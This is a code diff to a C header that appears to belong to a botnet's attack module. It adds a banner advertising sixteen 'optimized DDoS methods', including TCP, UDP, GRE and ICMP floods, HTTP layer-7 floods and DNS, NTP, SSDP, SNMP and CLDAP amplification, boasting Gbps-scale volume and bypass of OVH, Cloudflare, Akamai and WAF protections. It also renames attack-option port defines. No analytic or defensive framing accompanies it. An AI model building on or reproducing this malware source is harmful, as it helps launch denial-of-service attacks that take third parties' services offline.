@@ -4,7 +4,14 @@
 #include "includes.h"
 
 /* ============================================================================
- * ATTACK VECTORS - Optimized methods
+ * ATTACK VECTORS - 16 Optimized DDoS Methods
+ * ============================================================================
+ * Layer 4 (9 methods): TCP, UDP, OVH bypass, ICMP, GRE, Combined
+ * Layer 7 (3 methods): HTTP, AXIS-L7, ULTIMATE-L7
+ * Amplification (4 methods): DNS, NTP, SSDP, SNMP, CLDAP
+ * 
+ * Performance: Gbps-scale volumetric attacks
+ * Bypass: OVH Game, Cloudflare, Akamai, WAF evasion
  * ============================================================================ */
 #define ATK_VEC_TCP         0   /* TCP flood optimized for Gbps */
 #define ATK_VEC_UDP         1   /* UDP flood optimized for Gbps */
@@ -47,9 +54,9 @@
 #define ATK_OPT_USERAGENT       16
 #define ATK_OPT_COOKIES         17
 #define ATK_OPT_REFERER         18
-#define ATK_OPT_DPORT_TCP       19  /* TCP port for AXIS-L4 */
-#define ATK_OPT_DPORT_UDP       20  /* UDP port for AXIS-L4 */
-#define ATK_OPT_DPORT_GRE       21  /* GRE port for AXIS-L4 */
+#define ATK_OPT_DPORT_TCP       19  /* TCP port for AXIS-TCP */
+#define ATK_OPT_DPORT_UDP       20  /* UDP port for AXIS-UDP */
+#define ATK_OPT_DPORT_GRE       21  /* GRE port for AXIS-TCP/AXIS-UDP */
 
 /* ============================================================================
  * ATTACK STRUCTURES
